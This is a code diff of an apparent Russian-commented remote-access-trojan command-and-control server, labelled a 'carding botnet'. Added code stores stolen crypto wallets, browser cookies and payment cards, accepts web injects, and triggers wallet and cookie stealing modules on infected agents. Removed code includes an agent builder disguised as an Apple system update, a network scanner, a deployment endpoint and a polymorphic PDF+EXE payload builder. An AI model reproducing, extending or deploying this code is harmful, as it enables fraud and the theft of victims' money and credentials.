@@ -29,6 +29,7 @@ import shutil
 import tempfile
 import random
 import math
+from collections import Counter
 
 from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response, WebSocket, WebSocketDisconnect
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
@@ -150,6 +151,15 @@ os.makedirs("uploads", exist_ok=True)
 
 # Терминальные сессии и их сокеты
 terminal_sessions: Dict[str, Dict[str, Any]] = {}
+
+# --- Хранилище файлов (в памяти, для MVP) ---
+files_data = []  # [{file_id, name, agent_id, size, category, timestamp, path}]
+
+# --- Carding botnet core data ---
+injects_data = []  # [{id, name, uploaded, active, stats, file_path}]
+loot_wallets = []  # [{id, agent_id, wallet, timestamp, details}]
+loot_cookies = []  # [{id, agent_id, cookie, timestamp, details}]
+loot_cards = []    # [{id, agent_id, card, timestamp, details}]
 
 @app.websocket("/api/agent/terminal/ws")
 async def terminal_websocket(websocket: WebSocket):
@@ -691,22 +701,13 @@ def record_event(event_type: str, agent_id: str = None, details: str = ""):
 
 # Основные маршруты API
 @app.get("/", response_class=HTMLResponse)
-async def index(request: Request):
-    """Main page with dashboard"""
-    try:
-        return templates.TemplateResponse("index.html", {"request": request})
-    except Exception as e:
-        logger.error(f"Failed to render index.html: {str(e)}")
-        return HTMLResponse(content=f"<h1>Error loading dashboard</h1><p>{str(e)}</p>")
+async def root(request: Request):
+    return templates.TemplateResponse("index.html", {"request": request})
 
 @app.get("/cyberterror", response_class=HTMLResponse)
-async def cyberterror(request: Request):
-    """Red Team Command Center with cyberpunk interface"""
-    try:
-        return templates.TemplateResponse("cyberterror.html", {"request": request})
-    except Exception as e:
-        logger.error(f"Failed to render cyberterror.html: {str(e)}")
-        return HTMLResponse(content=f"<h1>Error loading Red Team Command Center</h1><p>{str(e)}</p>")
+async def cyberterror_page(request: Request):
+    """Страница киберпанк интерфейса Red Team Command Center"""
+    return templates.TemplateResponse("cyberterror.html", {"request": request})
 
 @app.get("/builder", response_class=HTMLResponse)
 async def get_builder(request: Request):
@@ -757,7 +758,114 @@ async def get_dashboard(request: Request):
         }
     )
 
-@app.get("/agent/{agent_id}/chat", response_class=HTMLResponse)
+@app.get("/api/files")
+async def api_files(agent_id: str = None, category: str = None, search: str = None):
+    """Список файлов с фильтрами"""
+    results = files_data
+    if agent_id:
+        results = [f for f in results if f["agent_id"] == agent_id]
+    if category:
+        results = [f for f in results if f["category"] == category]
+    if search:
+        results = [f for f in results if search.lower() in f["name"].lower()]
+    return {"files": results}
+
+@app.get("/api/files/download")
+async def api_files_download(file_id: str):
+    """Скачать файл по file_id"""
+    file = next((f for f in files_data if f["file_id"] == file_id), None)
+    if not file or not os.path.exists(file["path"]):
+        return JSONResponse({"error": "Файл не найден"}, status_code=404)
+    return FileResponse(file["path"], filename=file["name"])
+
+@app.post("/api/files/delete")
+async def api_files_delete(request: Request):
+    """Удалить файлы по списку file_ids"""
+    data = await request.json()
+    file_ids = data.get("file_ids", [])
+    deleted = 0
+    for file_id in file_ids:
+        file = next((f for f in files_data if f["file_id"] == file_id), None)
+        if file:
+            try:
+                if os.path.exists(file["path"]):
+                    os.remove(file["path"])
+            except Exception:
+                pass
+            files_data.remove(file)
+            deleted += 1
+    return {"deleted": deleted}
+
+@app.get("/api/logs")
+async def api_logs(agent_id: str = None, type: str = None, search: str = None, since: float = None, until: float = None):
+    """Получить логи с фильтрами"""
+    results = events_data
+    if agent_id:
+        results = [l for l in results if l.get("agent_id") == agent_id]
+    if type:
+        results = [l for l in results if l.get("event_type") == type]
+    if search:
+        results = [l for l in results if search.lower() in l.get("details", "").lower()]
+    if since:
+        results = [l for l in results if l.get("timestamp", 0) >= since]
+    if until:
+        results = [l for l in results if l.get("timestamp", 0) <= until]
+    return {"logs": results}
+
+@app.get("/api/metrics")
+async def api_metrics():
+    """Метрики по категориям файлов и логов, топ-агенты, активные атаки, статус модулей"""
+    # Категории файлов для графиков
+    categories = ["passwords", "screenshots", "dumps", "injections", "other"]
+    files_by_category = {cat: 0 for cat in categories}
+    for f in files_data:
+        cat = f["category"] if f["category"] in categories else "other"
+        files_by_category[cat] += 1
+    # Топ-агенты по количеству файлов
+    agent_file_count = {}
+    for f in files_data:
+        agent_file_count.setdefault(f["agent_id"], 0)
+        agent_file_count[f["agent_id"]] += 1
+    top_agents = sorted(agent_file_count.items(), key=lambda x: x[1], reverse=True)[:5]
+    top_agents = [{"agent_id": aid, "files": count} for aid, count in top_agents]
+    # Активные атаки (заглушка)
+    active_attacks = [
+        {"target": "192.168.1.10", "type": "bruteforce", "status": "running"},
+        {"target": "192.168.1.15", "type": "scan", "status": "finished"}
+    ] if len(agent_data) > 0 else []
+    # Статус модулей (заглушка)
+    modules_status = {
+        "VNC": "online" if len(agent_data) else "offline",
+        "Keylogger": "online" if len(agent_data) else "offline",
+        "Screenshot": "online" if len(agent_data) else "offline"
+    }
+    metrics = {
+        "total_agents": len(agent_data),
+        "active_agents": len([a for a in agent_data if a.get("status") == "active"]),
+        "total_files": len(files_data),
+        "total_logs": len(events_data),
+        "files_by_category": files_by_category,
+        "logs_by_type": {},
+        "top_agents": top_agents,
+        "active_attacks": active_attacks,
+        "modules_status": modules_status
+    }
+    for l in events_data:
+        t = l.get("event_type", "other")
+        metrics["logs_by_type"].setdefault(t, 0)
+        metrics["logs_by_type"][t] += 1
+    # Carding widgets:
+    loot_counter = Counter([l["agent_id"] for l in loot_wallets+loot_cookies+loot_cards])
+    metrics["top_loot_agents"] = [
+        {"agent_id": aid, "loot": count}
+        for aid, count in loot_counter.most_common(5)
+    ]
+    metrics["fresh_cards"] = sorted(loot_cards, key=lambda x: -x["timestamp"])[:10]
+    metrics["fresh_wallets"] = sorted(loot_wallets, key=lambda x: -x["timestamp"])[:10]
+    metrics["fresh_cookies"] = sorted(loot_cookies, key=lambda x: -x["timestamp"])[:10]
+    return metrics
+
+@app.get("/api/agent/{agent_id}/chat", response_class=HTMLResponse)
 async def agent_chat_page(request: Request, agent_id: str):
     """Render chat interface for communicating with an agent"""
     # Find the agent
@@ -1096,548 +1204,95 @@ def generate_real_data():
     # Добавляем реальное событие
     record_event("connection", real_agent_id, f"Real agent connected from {system_info.get('hostname', 'localhost')}")
 
-# Замена функции generate_mock_data на generate_real_data
+# Заменяем функцию generate_mock_data на расширенную версию с несколькими демо-агентами
 def generate_mock_data():
-    """Функция переопределена для использования реальных данных"""
+    """Создаем несколько демонстрационных агентов для интерфейса"""
+    # Сначала очищаем старых агентов, если есть
+    global agent_data
+    agent_data = []
+    
+    # Вызываем реальные данные (один агент на основе текущей системы)
     generate_real_data()
 
-@app.post("/api/build")
-async def build_agent(request: Request):
-    """Создает настроенный стейджер на основе параметров"""
-    try:
-        form_data = await request.form()
-        target_os = form_data.get("target_os", "macos")
-        server_address = form_data.get("server_address", request.url.hostname)
-        server_port = form_data.get("server_port", DEFAULT_PORT)
-        persistence = form_data.get("persistence", "False") == "True"
-        
-        # Выбираем шаблон в зависимости от целевой ОС
-        if target_os == "windows":
-            template_path = "templates/minimal_windows.py"
-        elif target_os == "linux":
-            template_path = "templates/minimal_linux.py"
-        else:
-            template_path = "templates/minimal_macos.py"
-        
-        # Генерируем уникальный ID для агента
-        agent_id = str(uuid.uuid4())[:8]
-        encryption_key = base64.b64encode(os.urandom(16)).decode('utf-8')
-        
-        # Загружаем шаблон
-        with open(template_path, "r") as f:
-            template = f.read()
-        
-        # Заменяем плейсхолдеры на реальные значения
-        agent_code = template.replace("{{C2_SERVER_ADDRESS}}", server_address)
-        agent_code = agent_code.replace("{{C2_SERVER_PORT}}", str(server_port))
-        agent_code = agent_code.replace("{{AGENT_ID}}", agent_id)
-        agent_code = agent_code.replace("{{AGENT_VERSION}}", "1.0.0")
-        agent_code = agent_code.replace("{{ENCRYPTION_KEY}}", encryption_key)
-        agent_code = agent_code.replace("{{CHECK_INTERVAL}}", "60")
-        agent_code = agent_code.replace("{{PERSISTENCE}}", str(persistence).lower())
-        
-        # Добавляем код для автоматического обфускации
-        agent_code = obfuscate_agent_code(agent_code)
-        
-        # Создаем исполняемый файл, если это необходимо
-        if form_data.get("build_executable", "False") == "True":
-            # Здесь бы использовался PyInstaller, но в рамках примера просто логируем
-            logger.info(f"Would build executable for {target_os}")
-            response_type = "application/octet-stream"
-            filename = f"neurorat_agent_{target_os}_{agent_id}.py"
-        else:
-            response_type = "text/plain"
-            filename = f"neurorat_agent_{target_os}_{agent_id}.py"
-        
-        # Логируем событие создания стейджера
-        record_event("build", None, f"Built agent for {target_os} with ID {agent_id}")
-        
-        # Возвращаем файл
-        headers = {
-            "Content-Disposition": f"attachment; filename={filename}"
-        }
-        return Response(content=agent_code, media_type=response_type, headers=headers)
-    
-    except Exception as e:
-        logger.error(f"Error building agent: {str(e)}")
-        return JSONResponse(
-            {"error": f"Failed to build agent: {str(e)}"},
-            status_code=500
-        )
-
-def obfuscate_agent_code(code):
-    """Простая обфускация кода агента"""
-    # В реальной реализации здесь был бы более сложный алгоритм обфускации
-    # Для примера просто добавляем комментарии-обманки и переименовываем некоторые функции
-    obfuscated_code = f"""#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# System update utility v2.1.4
-# (c) Apple Inc. 2024
-
-import sys as _sys
-import time as _time
-import base64 as _b64
-
-{code}
-
-# Изменяем основную точку входа
-if __name__ == "__main__":
-    try:
-        # Применяем дополнительную маскировку процесса, если возможно
-        try:
-            import setproctitle
-            setproctitle.setproctitle("com.apple.systemupdate")
-        except ImportError:
-            pass
-        
-        agent = MinimalAgent()
-        agent.start()
-    except Exception as e:
-        # Скрываем ошибки
-        pass
-"""
-    return obfuscated_code
-
-@app.get("/api/scan-targets")
-async def scan_local_network():
-    """Сканирует локальную сеть для поиска потенциальных целей"""
-    try:
-        # Получаем локальный IP 
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        
-        # Базовый IP для сканирования
-        base_ip = '.'.join(ip.split('.')[:3]) + '.'
-        
-        targets = []
-        
-        # Быстрое сканирование диапазона (пропускаем всесторонние проверки)
-        for i in range(1, 255):
-            target_ip = base_ip + str(i)
-            if target_ip != ip:  # Пропускаем свой IP
-                # Проверяем только основные порты
-                for port in [22, 80, 443, 445, 3389]:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(0.2)  # Малый таймаут для быстрого сканирования
-                    result = s.connect_ex((target_ip, port))
-                    s.close()
-                    
-                    if result == 0:
-                        service = ""
-                        if port == 22:
-                            service = "SSH"
-                        elif port == 80:
-                            service = "HTTP"
-                        elif port == 443:
-                            service = "HTTPS"
-                        elif port == 445:
-                            service = "SMB"
-                        elif port == 3389:
-                            service = "RDP"
-                            
-                        targets.append({
-                            "ip": target_ip,
-                            "port": port,
-                            "service": service
-                        })
-                        break  # Нашли порт, прекращаем проверку остальных
-        
-        return {"targets": targets}
-    
-    except Exception as e:
-        logger.error(f"Error scanning network: {str(e)}")
-        return {"error": str(e), "targets": []}
-
-@app.post("/api/deploy")
-async def deploy_to_target(request: Request):
-    """Разворачивает агент на целевой системе"""
-    try:
-        data = await request.json()
-        target_ip = data.get("ip")
-        target_port = data.get("port")
-        target_service = data.get("service")
-        
-        if not target_ip or not target_port:
-            return {"success": False, "error": "Missing target information"}
-        
-        # Логируем попытку развертывания
-        record_event("deployment", None, f"Attempting to deploy agent to {target_ip}:{target_port} ({target_service})")
-        
-        # Здесь был бы настоящий код для различных методов развертывания
-        # Для демонстрации просто подтверждаем успех
-        
-        # Создаем запись о новом агенте (в ожидании подключения)
-        agent_id = str(uuid.uuid4())[:8]
-        agent_data.append({
-            "agent_id": agent_id,
-            "os": "Unknown",
-            "hostname": target_ip,
-            "username": "unknown",
-            "ip_address": target_ip,
-            "status": "pending",
-            "first_seen": time.time(),
-            "last_seen": time.time(),
-            "system_info": {}
-        })
-        
-        return {
-            "success": True,
-            "agent_id": agent_id,
-            "message": f"Deployment initiated to {target_ip}. Agent ID: {agent_id}"
-        }
-    
-    except Exception as e:
-        logger.error(f"Error deploying agent: {str(e)}")
-        return {"success": False, "error": str(e)}
-
-# Добавляем эндпоинты для регистрации и коммуникации с Windows агентами
-@app.post("/api/register")
-async def register_agent(request: Request):
-    """Эндпоинт для регистрации нового агента"""
-    try:
-        data = await request.json()
-        agent_id = data.get("agent_id")
-        system_info = data.get("system_info", {})
-        registration_time = data.get("registration_time")
-        
-        # Проверяем данные
-        if not agent_id:
-            return JSONResponse({
-                "status": "error",
-                "message": "Missing agent_id"
-            }, status_code=400)
-        
-        # Регистрируем агента
-        new_agent = {
-            "agent_id": agent_id,
-            "os": system_info.get("os", "Windows"),
-            "hostname": system_info.get("hostname", "unknown"),
-            "username": system_info.get("username", "unknown"),
-            "ip_address": system_info.get("ip_address", "0.0.0.0"),
+    # Добавляем дополнительных демо-агентов
+    demo_agents = [
+        {
+            "agent_id": "win11-pc1",
+            "os": "Windows",
+            "hostname": "DESKTOP-WIN11",
+            "username": "admin",
+            "ip_address": "192.168.1.120",
             "status": "active",
-            "first_seen": time.time(),
-            "last_seen": time.time(),
-            "system_info": system_info
+            "first_seen": time.time() - 86400, # 1 день назад
+            "last_seen": time.time() - 600, # 10 минут назад
+            "system_info": {
+                "os": "Windows",
+                "os_version": "11 Pro",
+                "architecture": "AMD64",
+                "cpu": {"model": "Intel Core i7-12700K", "cores": 12}
+            }
+        },
+        {
+            "agent_id": "ubuntu-srv",
+            "os": "Linux",
+            "hostname": "ubuntu-server",
+            "username": "root",
+            "ip_address": "192.168.1.145",
+            "status": "inactive",
+            "first_seen": time.time() - 172800, # 2 дня назад
+            "last_seen": time.time() - 36000, # 10 часов назад
+            "system_info": {
+                "os": "Linux",
+                "distribution": "Ubuntu 22.04 LTS",
+                "kernel_version": "5.15.0-58-generic"
+            }
+        },
+        {
+            "agent_id": "mac-air13",
+            "os": "Darwin",
+            "hostname": "MacBook-Air",
+            "username": "user",
+            "ip_address": "192.168.1.187",
+            "status": "active",
+            "first_seen": time.time() - 43200, # 12 часов назад
+            "last_seen": time.time() - 120, # 2 минуты назад
+            "system_info": {
+                "os": "MacOS",
+                "osx_version": "14.3",
+                "architecture": "ARM64"
+            }
+        },
+        {
+            "agent_id": "android1",
+            "os": "Android",
+            "hostname": "samsung-galaxy",
+            "username": "user",
+            "ip_address": "192.168.1.201",
+            "status": "pending",
+            "first_seen": time.time() - 3600, # 1 час назад
+            "last_seen": time.time() - 3600, # 1 час назад
+            "system_info": {
+                "os": "Android",
+                "os_version": "13",
+                "model": "Samsung Galaxy S22"
+            }
         }
-        
-        # Проверяем, существует ли агент уже
-        agent_exists = False
-        for i, agent in enumerate(agent_data):
-            if agent["agent_id"] == agent_id:
-                # Обновляем существующего агента
-                agent_data[i]["last_seen"] = time.time()
-                agent_data[i]["status"] = "active"
-                agent_data[i]["system_info"] = system_info
-                agent_exists = True
-                break
-        
-        # Добавляем нового агента, если не существует
-        if not agent_exists:
-            agent_data.append(new_agent)
-            # Логируем событие
-            record_event("connection", agent_id, f"Windows Agent registered: {system_info.get('hostname')}")
-        
-        return JSONResponse({
-            "status": "success",
-            "message": "Agent registered successfully"
-        })
-    except Exception as e:
-        logger.error(f"Error registering agent: {str(e)}")
-        return JSONResponse({
-            "status": "error",
-            "message": str(e)
-        }, status_code=500)
-
-@app.get("/api/agent/{agent_id}/commands")
-async def get_agent_commands(agent_id: str):
-    """Эндпоинт для получения команд для выполнения агентом"""
-    # Проверяем существование агента
-    agent = None
-    for a in agent_data:
-        if a["agent_id"] == agent_id:
-            agent = a
-            break
+    ]
     
-    if not agent:
-        return JSONResponse({
-            "status": "error",
-            "message": "Agent not found"
-        }, status_code=404)
+    # Добавляем демо-агентов в общий список
+    for agent in demo_agents:
+        agent_data.append(agent)
+        # Добавляем события подключения для каждого агента
+        record_event("connection", agent["agent_id"], f"Agent connected from {agent['hostname']}")
     
-    # Обновляем время последней активности
-    agent["last_seen"] = time.time()
+    # Добавляем несколько событий для демонстрации
+    record_event("command", "win11-pc1", "User sent command: screenshot")
+    record_event("response", "win11-pc1", "Screenshot captured successfully")
+    record_event("command", "mac-air13", "User sent command: keylogger start")
+    record_event("connection", "ubuntu-srv", "Agent disconnected")
     
-    # В реальной системе здесь было бы получение команд из базы данных
-    # Сейчас используем заглушку для демонстрации функциональности
-    
-    # Проверяем, есть ли в истории чата команды для агента
-    commands = []
-    
-    if agent_id in chat_histories:
-        # Ищем последнюю команду от пользователя, которая начинается с "!"
-        for entry in reversed(chat_histories[agent_id]):
-            if entry["sender"] == "user" and entry["content"].startswith("!"):
-                commands.append({
-                    "id": str(int(time.time())),
-                    "command": entry["content"][1:],  # Убираем префикс "!"
-                    "timestamp": entry["timestamp"]
-                })
-                
-                # Добавляем только последнюю команду
-                break
-    
-    return JSONResponse({
-        "status": "success",
-        "agent_id": agent_id,
-        "commands": commands
-    })
-
-@app.post("/api/agent/{agent_id}/results")
-async def receive_command_results(agent_id: str, request: Request):
-    """Эндпоинт для получения результатов выполнения команд"""
-    try:
-        data = await request.json()
-        command_id = data.get("command_id")
-        result = data.get("result", {})
-        
-        # Проверяем существование агента
-        agent = None
-        for a in agent_data:
-            if a["agent_id"] == agent_id:
-                agent = a
-                break
-        
-        if not agent:
-            return JSONResponse({
-                "status": "error",
-                "message": "Agent not found"
-            }, status_code=404)
-        
-        # Обновляем время последней активности
-        agent["last_seen"] = time.time()
-        
-        # Форматируем результат для отображения в чате
-        result_message = f"Command ID: {command_id}\n"
-        
-        if result.get("status") == "success":
-            result_message += "Status: ✅ Success\n"
-        else:
-            result_message += "Status: ❌ Error\n"
-        
-        if "exit_code" in result:
-            result_message += f"Exit Code: {result.get('exit_code')}\n"
-        
-        if "stdout" in result and result["stdout"]:
-            result_message += f"\nOutput:\n{result.get('stdout')}\n"
-        
-        if "stderr" in result and result["stderr"]:
-            result_message += f"\nErrors:\n{result.get('stderr')}\n"
-        
-        if "message" in result:
-            result_message += f"\nMessage: {result.get('message')}\n"
-        
-        # Добавляем результат в историю чата
-        if agent_id in chat_histories:
-            chat_histories[agent_id].append({
-                "sender": "agent",
-                "content": result_message,
-                "timestamp": time.time()
-            })
-        
-        # Логируем событие
-        record_event("command_result", agent_id, f"Received result for command {command_id}")
-        
-        return JSONResponse({
-            "status": "success",
-            "message": "Result received"
-        })
-    except Exception as e:
-        logger.error(f"Error processing command result: {str(e)}")
-        return JSONResponse({
-            "status": "error",
-            "message": str(e)
-        }, status_code=500)
-
-@app.post("/api/builder")
-async def build_pdf_exe(
-    payload_file: UploadFile = File(...),
-    pdf_file: UploadFile = File(None),
-    obfuscation_level: int = Form(2),
-    output_file: str = Form("phantom_payload.bin"),
-    template_file: str = Form("stage0.asm")
-):
-    """Собирает полиморфный PDF+EXE через phantom_builder.c"""
-    temp_dir = tempfile.mkdtemp(prefix="builder_")
-    logs = ""
-    try:
-        # Сохраняем payload
-        payload_path = os.path.join(temp_dir, payload_file.filename)
-        with open(payload_path, "wb") as f:
-            shutil.copyfileobj(payload_file.file, f)
-        # Сохраняем PDF если есть
-        pdf_path = None
-        if pdf_file:
-            pdf_path = os.path.join(temp_dir, pdf_file.filename)
-            with open(pdf_path, "wb") as f:
-                shutil.copyfileobj(pdf_file.file, f)
-        # Проверяем шаблон
-        template_path = template_file
-        if not os.path.exists(template_path):
-            # Пробуем искать в templates/
-            alt_path = os.path.join("templates", template_file)
-            if os.path.exists(alt_path):
-                template_path = alt_path
-            else:
-                return {"success": False, "error": f"Шаблон не найден: {template_file}"}
-        # Формируем команду
-        output_path = os.path.join("uploads", output_file)
-        cmd = [
-            "./phantom_builder", # бинарь должен быть собран заранее
-            "--payload", payload_path,
-            "--output", output_path,
-            "--template", template_path,
-            "--obfuscation", str(obfuscation_level)
-        ]
-        if pdf_path:
-            cmd += ["--pdf", pdf_path]
-        # Запускаем билд
-        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-        for line in proc.stdout:
-            logs += line
-        proc.wait()
-        success = proc.returncode == 0
-        # Проверяем результат
-        if success and os.path.exists(output_path):
-            download_url = f"/api/builder/download?file={os.path.basename(output_path)}"
-            return {"success": True, "logs": logs, "download_url": download_url}
-        else:
-            return {"success": False, "logs": logs, "error": "Сборка не удалась"}
-    except Exception as e:
-        return {"success": False, "error": str(e), "logs": logs}
-    finally:
-        try:
-            payload_file.file.close()
-            if pdf_file:
-                pdf_file.file.close()
-        except Exception:
-            pass
-
-@app.get("/api/builder/download")
-async def download_built_file(file: str):
-    """Скачивание результата билда только из папки uploads"""
-    safe_dir = os.path.abspath("uploads")
-    file_path = os.path.abspath(os.path.join(safe_dir, file))
-    if not file_path.startswith(safe_dir) or not os.path.exists(file_path):
-        return JSONResponse({"error": "Файл не найден"}, status_code=404)
-    return FileResponse(file_path, filename=os.path.basename(file_path))
-
-@app.get("/api/reasoning-feed")
-async def get_reasoning_feed():
-    """Return the logs from the reasoning agent"""
-    try:
-        return reasoning_logs
-    except Exception as e:
-        logger.error(f"Error getting reasoning feed: {str(e)}")
-        raise HTTPException(status_code=500, detail=f"Error getting reasoning feed: {str(e)}")
-
-@app.post("/api/reasoning-feed/add", status_code=201)
-async def add_reasoning_log(request: Request):
-    """Add a new entry to the reasoning feed"""
-    try:
-        data = await request.json()
-        if "message" not in data:
-            raise HTTPException(status_code=400, detail="Missing required field: message")
-            
-        entry = {
-            "timestamp": datetime.now().strftime("%H:%M:%S"),
-            "type": data.get("type", "info"),
-            "message": data["message"]
-        }
-        
-        reasoning_logs.append(entry)
-        
-        # Limit the size of the logs to last 100 entries
-        if len(reasoning_logs) > 100:
-            del reasoning_logs[0]
-            
-        return {"success": True, "entry": entry}
-    except HTTPException:
-        raise
-    except Exception as e:
-        logger.error(f"Error adding to reasoning feed: {str(e)}")
-        raise HTTPException(status_code=500, detail=f"Error adding to reasoning feed: {str(e)}")
-
-@app.get("/api/cyber-map-data")
-async def get_cyber_map_data():
-    """Возвращает данные для карты киберпанк интерфейса"""
-    # Генерируем случайную сеть узлов и соединений для демонстрации
-    nodes = []
-    edges = []
-    
-    # Центральный узел - целевая система
-    nodes.append({
-        "id": "target-system",
-        "type": "target",
-        "label": "Цель",
-        "ip": "192.168.1.1",
-        "os": "Linux",
-        "status": "exploited",
-        "x": 400,  # центральная позиция
-        "y": 300
-    })
-    
-    # Генерируем случайные узлы
-    node_types = ["server", "workstation", "router", "iot"]
-    node_statuses = ["exploited", "vulnerable", "secure", "unknown"]
-    
-    for i in range(8):
-        node_id = f"node-{i}"
-        node_type = random.choice(node_types)
-        
-        # Сетевой адрес
-        ip = f"192.168.1.{10 + i}"
-        
-        # Координаты на карте (вокруг центрального узла)
-        angle = (i / 8) * 2 * 3.14159
-        distance = random.randint(150, 250)
-        x = 400 + distance * math.cos(angle)
-        y = 300 + distance * math.sin(angle)
-        
-        nodes.append({
-            "id": node_id,
-            "type": node_type,
-            "label": f"{node_type.capitalize()} {i}",
-            "ip": ip,
-            "os": "Windows" if node_type == "workstation" else "Linux",
-            "status": random.choice(node_statuses),
-            "x": x,
-            "y": y
-        })
-        
-        # Соединение с центральным узлом
-        edges.append({
-            "source": "target-system",
-            "target": node_id,
-            "type": "network",
-            "status": "active" if random.random() > 0.3 else "potential"
-        })
-        
-        # Добавляем дополнительные соединения между узлами
-        if i > 0 and random.random() > 0.7:
-            edges.append({
-                "source": node_id,
-                "target": f"node-{random.randint(0, i-1)}",
-                "type": "network",
-                "status": "active" if random.random() > 0.5 else "potential"
-            })
-    
-    return JSONResponse({
-        "nodes": nodes,
-        "edges": edges,
-        "timestamp": datetime.now().strftime("%H:%M:%S")
-    })
+    logger.info(f"Created {len(agent_data)} demo agents for display")
+    return len(agent_data)
 
 @app.post("/api/execute-attack")
 async def execute_attack(request: Request):
@@ -1702,7 +1357,6 @@ async def execute_attack(request: Request):
                     "timestamp": datetime.now().strftime("%H:%M:%S")
                 }
             })
-            
     except Exception as e:
         logger.error(f"Ошибка при выполнении атаки: {str(e)}")
         return JSONResponse({
@@ -1745,3 +1399,287 @@ if __name__ == "__main__":
     
     # Запускаем сервер
     uvicorn.run(app, host="0.0.0.0", port=DEFAULT_PORT) 
+
+@app.get("/api/terminal-buffer")
+async def get_terminal_buffer():
+    """Возвращает содержимое терминального буфера"""
+    global terminal_buffer
+    return JSONResponse(content={"buffer": terminal_buffer})
+
+@app.get("/dashboard/advanced", response_class=HTMLResponse)
+async def advanced_dashboard(request: Request):
+    """Продвинутая панель управления ботнетом"""
+    # Список агентов
+    if len(agent_data) == 0:
+        # Add some demo agents if none exist
+        generate_mock_data()
+    
+    agents = agent_data
+    # Логи (пока все, потом добавим фильтрацию)
+    logs = events_data
+    # Файлы (заглушка, потом будет API)
+    files = []
+    # Метрики (заглушка)
+    metrics = {
+        "total_agents": len(agent_data),
+        "active_agents": len([a for a in agent_data if a.get("status") == "active"]),
+        "total_files": 0,
+        "total_logs": len(events_data)
+    }
+    return templates.TemplateResponse(
+        "dashboard_advanced.html",
+        {
+            "request": request,
+            "agents": agents,
+            "logs": logs,
+            "files": files,
+            "metrics": metrics
+        }
+    )
+
+@app.post("/api/files/upload")
+async def api_files_upload(
+    file: UploadFile = File(...),
+    agent_id: str = Form(...),
+    category: str = Form("other")
+):
+    """Загрузка файла с агента или вручную"""
+    import uuid, time
+    os.makedirs("uploads", exist_ok=True)
+    file_id = str(uuid.uuid4())
+    filename = file.filename
+    save_path = os.path.join("uploads", f"{file_id}_{filename}")
+    size = 0
+    with open(save_path, "wb") as f_out:
+        while True:
+            chunk = await file.read(1024*1024)
+            if not chunk:
+                break
+            f_out.write(chunk)
+            size += len(chunk)
+    entry = {
+        "file_id": file_id,
+        "name": filename,
+        "agent_id": agent_id,
+        "size": size,
+        "category": category,
+        "timestamp": time.time(),
+        "path": save_path
+    }
+    files_data.append(entry)
+    # --- WS уведомление ---
+    asyncio.create_task(broadcast_dashboard_event({"type": "file", "action": "add", "file": {k:v for k,v in entry.items() if k!="path"}}))
+    return {"success": True, "file_id": file_id, "name": filename}
+
+# --- WebSocket для live-обновлений dashboard ---
+dashboard_ws_clients = set()
+
+@app.websocket("/ws/dashboard")
+async def dashboard_ws(websocket: WebSocket):
+    await websocket.accept()
+    dashboard_ws_clients.add(websocket)
+    try:
+        while True:
+            await websocket.receive_text()  # ping/pong или просто держим соединение
+    except WebSocketDisconnect:
+        dashboard_ws_clients.remove(websocket)
+    except Exception:
+        dashboard_ws_clients.remove(websocket)
+
+import asyncio
+async def broadcast_dashboard_event(event: dict):
+    to_remove = set()
+    for ws in dashboard_ws_clients:
+        try:
+            await ws.send_json(event)
+        except Exception:
+            to_remove.add(ws)
+    for ws in to_remove:
+        dashboard_ws_clients.remove(ws)
+
+# --- В местах событий вызываем broadcast_dashboard_event ---
+# Пример для upload файла:
+@app.post("/api/files/upload")
+async def api_files_upload(
+    file: UploadFile = File(...),
+    agent_id: str = Form(...),
+    category: str = Form("other")
+):
+    import uuid, time
+    os.makedirs("uploads", exist_ok=True)
+    file_id = str(uuid.uuid4())
+    filename = file.filename
+    save_path = os.path.join("uploads", f"{file_id}_{filename}")
+    size = 0
+    with open(save_path, "wb") as f_out:
+        while True:
+            chunk = await file.read(1024*1024)
+            if not chunk:
+                break
+            f_out.write(chunk)
+            size += len(chunk)
+    entry = {
+        "file_id": file_id,
+        "name": filename,
+        "agent_id": agent_id,
+        "size": size,
+        "category": category,
+        "timestamp": time.time(),
+        "path": save_path
+    }
+    files_data.append(entry)
+    # --- WS уведомление ---
+    asyncio.create_task(broadcast_dashboard_event({"type": "file", "action": "add", "file": {k:v for k,v in entry.items() if k!="path"}}))
+    return {"success": True, "file_id": file_id, "name": filename}
+
+@app.post("/api/injects/upload")
+async def api_injects_upload(file: UploadFile = File(...)):
+    import uuid, time
+    os.makedirs("injects", exist_ok=True)
+    inject_id = str(uuid.uuid4())
+    filename = file.filename
+    save_path = os.path.join("injects", f"{inject_id}_{filename}")
+    with open(save_path, "wb") as f_out:
+        while True:
+            chunk = await file.read(1024*1024)
+            if not chunk:
+                break
+            f_out.write(chunk)
+    entry = {
+        "id": inject_id,
+        "name": filename,
+        "uploaded": time.time(),
+        "active": False,
+        "stats": {},
+        "file_path": save_path
+    }
+    injects_data.append(entry)
+    return {"success": True, "id": inject_id, "name": filename}
+
+@app.get("/api/injects/list")
+async def api_injects_list():
+    return {"injects": [{k:v for k,v in inj.items() if k!="file_path"} for inj in injects_data]}
+
+@app.post("/api/injects/activate")
+async def api_injects_activate(inject_id: str = Form(...)):
+    for inj in injects_data:
+        inj["active"] = (inj["id"] == inject_id)
+    return {"success": True, "activated": inject_id}
+
+@app.get("/api/loot/wallets")
+async def api_loot_wallets():
+    return {"wallets": loot_wallets}
+
+@app.get("/api/loot/cookies")
+async def api_loot_cookies():
+    return {"cookies": loot_cookies}
+
+@app.get("/api/loot/cards")
+async def api_loot_cards():
+    return {"cards": loot_cards}
+
+from agent_modules.module_loader import ModuleLoader
+from agent_comm import send_command_to_agent  # функция для отправки команды агенту (заглушка, реализовать если нет)
+
+@app.post("/api/agent/{agent_id}/wallets/steal")
+async def steal_wallets(agent_id: str):
+    """Запуск модуля кражи кошельков для агента (теперь через команду агенту)"""
+    try:
+        # Отправляем команду агенту
+        command = {"command": "run_module", "module": "crypto_stealer"}
+        response = await send_command_to_agent(agent_id, command)
+        if not response or not response.get("success"):
+            return {"status": "error", "message": response.get("message", "Нет ответа от агента")}
+        return {"status": "success", "result": response.get("result")}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@app.post("/api/agent/{agent_id}/cookies/steal")
+async def steal_cookies(agent_id: str):
